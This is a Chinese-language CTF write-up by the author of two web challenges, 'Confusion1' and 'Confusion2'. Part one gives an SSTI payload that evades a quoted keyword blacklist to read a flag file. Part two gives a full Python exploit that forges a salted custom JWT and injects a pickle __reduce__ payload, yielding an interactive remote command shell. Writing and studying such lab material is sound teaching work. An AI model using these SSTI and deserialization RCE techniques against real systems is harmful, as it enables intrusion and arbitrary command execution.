# Confusion系列题目仅供娱乐
***
## Confusion1
* 首先浏览网站，在导航栏上只有index.php login.php register.php三个页面，打开导航栏上的login.php和register.php，发现是404页面

* 这个404页面乍一看和普通页面没什么不同，但是查看源码可以发现提示了flag的路径，所以题目意思就是要去读文件
* 但是login和register功能都没有实现，也就是说没有任何接受用户输入的地方

* 在index.php页面中有一张图片，图片的内容是一条大蟒蛇缠住了一只大象，很明显这只大象就是PHP的那只吉祥物，大蟒蛇也意味着Python了，所以这到题目应该和Python有关，但是还是不知道哪里可以接受到用户的输入

* 仔细翻阅网站，可以发现只有两处可被用户控制的地方，就是404页面和403页面中输出url的地方
* 首先试试这里有没有XSS，在404页面当我们输入XSS的payload时会弹出一个Nope，说明对某些字符进行了过滤，所以很问题明显就出在404页面

* 既然发现了404页面有问题，但是如果实在想不到SSTI的话那也没办法往下做了
* 测试{{5*5}}，发现404页面输出url的地方却输出了25，于是照着SSTI的思路往下做

* 后端其实用了Python来模拟PHP
* 我在黑名单中禁用了一些字符串，就不一一测试了，这里直接给出部分关键黑名单

````
	black_list = [
    'write', 'class', 'mro', 'read', '<', '>', '|', 'join'
    'os', 'sys', 'pop', 'del', 'rm', 'eval', 'exec', 'ls', 'cat',
    ';', '&&', 'catch_warnings', 'func_globals', 'pickle', 'import', 'subprocess', 'commands', 'input', 'execfile', 
    'reload', 'compile', 'execfile', 'kill', 'func_code'
]
```

关键字过滤可以使用request.args绕过

* POC: 
```
http://xx.xx.xx.xx:xxxx/{{''[request.args.a][request.args.b][2][request.args.c]()[40]('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')[request.args.d]()}}?a=__class__&b=__mro__&c=__subclasses__&d=read
```


***
## confusion2
* confusion1做出来了这个题就应该很好做了，已经知道后端是Python
* Confusion2和Confusion1相比只是多了注册和登录的功能，在注册和登录页面有md5的验证码，说明和sql注入无关
* 注册一个账号后登录，发现cookies里除了正常的sessionid外还有一个token，根据经验发现这是Json web token
* 这个JWT是我自己实现的，加密的算法是sha256，并不是标准的加密算法，除了加密算法不同外其他的都和JWT一样
* 在JWT的data里存放了一个类似PHP序列化的字符串，在这个字符串中又有一个user_data的值，有经验的可以看出user_data的值为python的序列化字符串，将这个值手动反序列化后可以发现是一个列表，第一项是用户名，第二项是密码的md5，所以这里存在python的反序列化漏洞，用reduce方法可以RCE
* 根据Hint，sha256里还加了salt，而这个salt在Confusion1里可以获得，这样就可以伪造JWT通过验证
* 注意在php的序列化字符串中user_data的字符数量必须和前面的数字相等
* exp如下

```python
	# -*- coding:utf-8 -*- 
	import cPickle
	import os
	import sys
	import base64
	import hashlib
	import json
	import Cookie
	import commands
	import MD5proof
	import requests
	import re


	if os.name != 'posix':
	    print 'This script must be run on Linux!'
	    sys.exit(1)
	
	sess = requests.Session()
	url = 'http://xxxx:xxxx/'
	md5proof = MD5proof.Md5Proof(0, 6)
	SALT = '_Y0uW1llN3verKn0w1t_'
	username = 'srpopty'
	password = 'srpopty'
	cmd = 'ls'
	
	
	def base64_url_encode(text):
	    return base64.b64encode(text).replace('+', '-').replace('/', '_').replace('=', '')
	
	
	def base64_url_decode(text):
	    text = text.replace('-', '+').replace('_', '/')
	    while True:
	        try:
	            result = base64.b64decode(text)
	        except TypeError:
	            text += '='
	        else:
	            break
	    return result
	
	
	class PickleRce(object):
	    def __reduce__(self):
	        return commands.getoutput, (cmd, )
	
	
	def register(username, password):
	    while True:
	        verify = md5proof.Proof(re.findall('\'\),0,6\) === \'(.*?)\'</span>',
	                                           sess.get(url + 'login.php', allow_redirects=False).content)[0])
	        if len(verify) > 0 and '*' not in verify:
	            break
	    data = {
	        'username': username,
	        'password': password,
	        'verify': verify
	    }
	    ret = sess.post(url + 'register.php', data=data, allow_redirects=False)
	    if 'success' in ret.content:
	        return True
	    else:
	        print '[!] Register failed!'
	        print ret.content
	        return False
	
	
	def login(username, password):
	    while True:
	        verify = md5proof.Proof(re.findall('\'\),0,6\) === \'(.*?)\'</span>',
	                                           sess.get(url + 'login.php', allow_redirects=False).content)[0])
	        if len(verify) > 0 and '*' not in verify:
	            break
	    data = {
	        'username': username,
	        'password': password,
	        'verify': verify
	    }
	    ret = sess.post(url + 'login.php', data=data, allow_redirects=False)
	    if 'success' in ret.content:
	        return ret
	    else:
	        print '[!] Login failed!'
	        print ret.content
	        return None
	
	
	def create_jwt(kid, data):
	    jwt_header = base64_url_encode(
	        '{"typ":"JWT","alg":"sha256","kid":"%d"}' % kid)
	    jwt_payload = base64_url_encode('{"data":"%s"}' % data)
	    jwt_signature = base64_url_encode(hashlib.sha256(
	        jwt_header + '.' + jwt_payload + SALT).hexdigest())
	    return jwt_header + '.' + jwt_payload + '.' + jwt_signature
	
	
	def serialize():
	    payload = cPickle.dumps([PickleRce(), PickleRce()])
	    data = json.dumps('O:4:"User":2:{s:9:"user_data";s:%d:"%s";}' % (
	        len(payload), payload))[1:-1]
	    print data
	    return data
	
	
	if register(username, password) is not None:
	    login_result = login(username, password)
	    if login_result is not None:
	        try:
	            while True:
	                cmd = raw_input('>>> ')
	                cookies = login_result.cookies
	                # print '[*] Old Cookie token: ' + cookies['token']
	                jwt = create_jwt(int(re.findall('"kid":"(.*?)"', base64_url_decode(
	                    login_result.cookies['token'].split('.')[0]))[0]), serialize())
	                new_token = Cookie.SimpleCookie().value_encode(jwt)[1]
	                # print '[*] New Cookie token: ' + new_token
	                new_cookies = {
	                    'PHPSESSID': cookies['PHPSESSID'],
	                    'token': new_token
	                }
	                ret = requests.get(url + 'index.php',
	                                   allow_redirects=False, cookies=new_cookies)
	                print '[*] RCE result: ' + re.findall('<p class="hello">Hello ([\s\S]*?)</p>', ret.content)[0]
	        except KeyboardInterrupt:
	            print '\nExit.'

	```